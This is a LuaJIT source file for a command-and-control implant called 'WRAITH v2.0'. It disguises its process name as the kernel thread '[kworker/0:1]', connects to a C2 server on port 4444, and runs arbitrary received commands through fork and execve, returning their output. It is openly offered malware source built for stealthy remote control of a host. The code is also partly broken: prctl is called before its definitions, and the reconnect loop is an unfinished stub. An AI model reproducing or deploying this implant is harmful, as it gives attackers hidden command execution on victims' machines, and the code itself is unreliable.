#!/usr/bin/env luajit
-- c2/c2_agent.lua - WITH ENVIRONMENT

local ffi = require("ffi")
local socket = require("socket")
local bit = require("bit")
local ffi = require("ffi")
ffi.C.prctl(PR_SET_NAME, ffi.cast("unsigned long", ffi.cast("const char*", "[kworker/0:1]")), 0, 0, 0)

ffi.cdef[[
    typedef int pid_t;
    typedef long ssize_t;
    
    int prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);
    pid_t fork(void);
    int pipe(int pipefd[2]);
    ssize_t read(int fd, void *buf, size_t count);
    int close(int fd);
    int dup2(int oldfd, int newfd);
    int execve(const char *pathname, char *const argv[], char *const envp[]);
    pid_t waitpid(pid_t pid, int *status, int options);
    void exit(int status);
    int access(const char *pathname, int mode);
]]

local PR_SET_NAME = 15
local X_OK = 1

ffi.C.prctl(PR_SET_NAME, ffi.cast("unsigned long", ffi.cast("const char*", "[kworker/0:1]")), 0, 0, 0)

local PATHS = {"/usr/bin/", "/bin/", "/usr/sbin/", "/sbin/", "/usr/local/bin/"}

local function resolve_path(cmd)
    if cmd:sub(1,1) == "/" then return cmd end
    for _, prefix in ipairs(PATHS) do
        local full = prefix .. cmd
        if ffi.C.access(full, X_OK) == 0 then return full end
    end
    return cmd
end

local function exec_syscall(cmd)
    local parts = {}
    for word in cmd:gmatch("%S+") do
        table.insert(parts, word)
    end
    
    if #parts == 0 then return "(empty)" end
    
    parts[1] = resolve_path(parts[1])
    
    local pipe_fds = ffi.new("int[2]")
    if ffi.C.pipe(pipe_fds) ~= 0 then return "(pipe failed)" end
    
    local pid = ffi.C.fork()
    
    if pid < 0 then
        ffi.C.close(pipe_fds[0])
        ffi.C.close(pipe_fds[1])
        return "(fork failed)"
    elseif pid == 0 then
        ffi.C.dup2(pipe_fds[1], 1)
        ffi.C.dup2(pipe_fds[1], 2)
        ffi.C.close(pipe_fds[0])
        ffi.C.close(pipe_fds[1])
        
        local argv = ffi.new("char*[?]", #parts + 1)
        for i, part in ipairs(parts) do
            argv[i-1] = ffi.cast("char*", part)
        end
        argv[#parts] = nil
        
        -- Build minimal environment
        local env_vars = {
            "PATH=/usr/bin:/bin:/usr/sbin:/sbin",
            "HOME=/root",
            "TERM=xterm",
        }
        
        local envp = ffi.new("char*[?]", #env_vars + 1)
        for i, env in ipairs(env_vars) do
            envp[i-1] = ffi.cast("char*", env)
        end
        envp[#env_vars] = nil
        
        ffi.C.execve(parts[1], argv, envp)
        ffi.C.exit(1)
    else
        ffi.C.close(pipe_fds[1])
        
        local output = {}
        local buf = ffi.new("char[4096]")
        
        while true do
            local n = ffi.C.read(pipe_fds[0], buf, 4096)
            if n <= 0 then break end
            table.insert(output, ffi.string(buf, n))
        end
        
        ffi.C.close(pipe_fds[0])
        
        local status = ffi.new("int[1]")
        ffi.C.waitpid(pid, status, 0)
        
        local result = table.concat(output)
        if result == "" and status[0] ~= 0 then
            return "(command failed)"
        end
        return result
    end
end

local function send_msg(sock, msg)
    local len = #msg
    local header = string.char(
        bit.band(bit.rshift(len, 24), 0xFF),
        bit.band(bit.rshift(len, 16), 0xFF),
        bit.band(bit.rshift(len, 8), 0xFF),
        bit.band(len, 0xFF)
    )
    return sock:send(header .. msg)
end

local function recv_msg(sock)
    local header = sock:receive(4)
    if not header then return nil end
    
    local len = bit.lshift(header:byte(1), 24) +
                bit.lshift(header:byte(2), 16) +
                bit.lshift(header:byte(3), 8) +
                header:byte(4)
    
    return sock:receive(len)
end

local client = assert(socket.connect(arg[1] or "127.0.0.1", tonumber(arg[2]) or 4444))
client:settimeout(30)

local hello = assert(recv_msg(client), "No hello")
assert(hello == "VIVISECT_C2_HELLO", "Bad handshake")
assert(send_msg(client, "WRAITH v2.0 | PURE SYSCALLS"))

while true do
    local client, err = socket.connect("127.0.0.1", 4444)
    if client then
        client:settimeout(60)
        -- handshake and command loop...
        -- on disconnect, loop back
    else
        socket.sleep(10)
    end
end

client:close()
